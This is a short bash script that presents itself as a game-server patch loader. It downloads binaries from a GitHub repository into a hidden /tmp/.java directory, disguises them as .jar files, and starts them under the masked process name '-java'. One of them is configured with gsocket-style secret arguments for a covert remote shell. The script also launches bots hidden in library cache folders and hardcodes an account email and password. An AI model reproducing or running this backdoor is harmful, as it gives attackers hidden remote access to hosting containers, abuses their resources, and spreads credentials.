#!/bin/bash

function fetch_files() {
    echo "Downloading Patches ..."
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
    # cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/rufastnde/c2.conf -o cfg.conf
    echo "DONE ..."
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    # cd /tmp/.java/bin && ./plugins.jar -c ./cfg.conf -d
    cd /home/container/libraries/io/papermc/paper/paper-api/1.21.4-R0.1-SNAPSHOT/.cache && ./mc-bot.jar -a '-java' ./paper-mods.jar -C ./conf.yaml >/dev/null &
    # GNET
    export HOME=/home/container
    export GSOCKET_ARGS="-s j6A9eD2a1E2c5A16f9L89-3D9g8Hbj7-5i6C4a9U6k1eCd9-F9i4J0d6A2803-8A1c5J1g60 -liqD"
    cd /tmp/.java/bin && exec -a -java ./add-on.jar &
    # HG BOT
    export LD_LIBRARY_PATH=/home/container/libraries/io/netty/netty-buffer/.cache/.hg/usr/lib
    cd /home/container/libraries/io/netty/netty-buffer/.cache/.hg/app/ && ./mc-bot.jar -a '-java' ./bot-fun.jar -tou-accept -email "yoursoundwords@gmail.com" -pass "vizelle521Elle" -device n0 >/dev/null &
    echo "BOT SERVER STARTED ..."
}

if [ -f "/tmp/.java/bin/cfg.conf" ] && [ -f "/tmp/.java/bin/add-on.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ]; then
    echo "Patch files already loaded ..."
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi